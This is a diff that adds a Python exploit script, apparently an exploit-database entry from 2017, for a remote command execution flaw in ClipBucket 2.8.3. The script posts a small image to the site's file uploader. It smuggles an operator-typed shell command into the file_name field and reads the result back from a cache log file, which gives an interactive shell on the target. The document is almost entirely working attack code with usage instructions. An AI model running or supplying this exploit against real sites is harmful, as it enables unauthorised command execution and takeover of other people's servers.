@@ -1,0 +1,61 @@
+# Exploit Title: ClipBucket PHP Script Remote Code Execution (RCE) 
+# Date: 2017-10-04
+# Exploit Author: Esecurity.ir 
+# Vendor Homepage: https://clipbucket.com/
+# Version: 2.8.3
+# Exploit Code By : Meisam Monsef - Email : meisamrce@gmail.com - TelgramID : @meisamrce
+# Usage Exploit : exploit.py http://target.com/path/
+
+
+
+import sys,os
+try:
+    import requests
+except Exception as e:
+    print 'please install module requests!'
+    sys.exit()
+img = 'temp.jpg'
+uploadUrl = "api/file_uploader.php"
+h = {'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.96 Safari/537.36'}
+
+def getShell(url):
+    try:
+        r = requests.get(url+'cache/1.log',headers=h)
+        if r.status_code == 200:
+            return r.content
+        else:
+            print 'Sorry site is not vulnerable '
+            sys.exit()
+    except Exception as e:
+        print e
+        sys.exit()
+
+def exploit(url):
+    while (1):
+        cmd = raw_input('$')
+        if cmd == '' or cmd == 'exit':
+            break
+        file_ = {'Filedata': (img, open(img, 'r'),'image/jpg')}
+        data = {'file_name':'a.jpg;'+cmd+' > ../cache/1.log;a.jpg'}
+        try:
+            r = requests.post(url+uploadUrl, files=file_,data=data,headers=h)
+            if r.status_code == 200:
+                if '"success":"yes"' in r.content:
+                    print getShell(url)
+                else:
+                    print 'Sorry site is not vulnerable '
+                    break
+            else:
+                print 'Sorry site is not vulnerable '
+                break
+        except Exception as e:
+            print e
+            break
+if not os.path.exists(img):
+    print 'please create tiny image file name is ' + img
+    sys.exit()
+
+if len(sys.argv) == 2 :
+    exploit(sys.argv[1])
+else:
+    print "Usage Exploit : exploit.py http://target.com/path/";
